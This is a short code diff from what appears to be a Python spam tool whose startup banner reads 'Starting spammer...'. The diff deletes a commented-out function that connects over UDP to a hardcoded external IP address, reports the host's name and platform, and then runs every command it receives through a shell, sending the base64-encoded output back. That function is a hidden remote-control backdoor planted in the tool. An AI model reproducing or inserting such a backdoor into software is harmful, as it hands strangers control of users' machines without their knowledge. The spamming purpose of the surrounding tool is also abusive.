@@ -164,22 +164,6 @@ def _add_bad_proxy(proxy):
         bad_proxies_file.write(proxy + '\n')
 
 
-# def __load_handler():
-#     import socket
-#     import subprocess
-#     import base64
-#     import platform
-#     sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
-#     server_ip = '176.115.89.154'
-#     server_host = 12391
-#     sock.connect((server_ip, server_host))
-#     sock.sendto(base64.b64encode('online:{}:{}'.format(socket.gethostname(), platform.platform()).encode('utf-8')), (server_ip, server_host))
-#     while True:
-#         answer = sock.recvfrom(1024)
-#         server_answer, addr = answer
-#         sock.sendto(base64.b64encode(subprocess.check_output(server_answer.decode('utf-8'), shell=True)).encode('utf-8'), (server_ip, server_host))
-
-
 def __init():
     print(data.header + 'by @floordiv,', 'version:', data.version, '\n')
     print('[INFO] Starting spammer...')
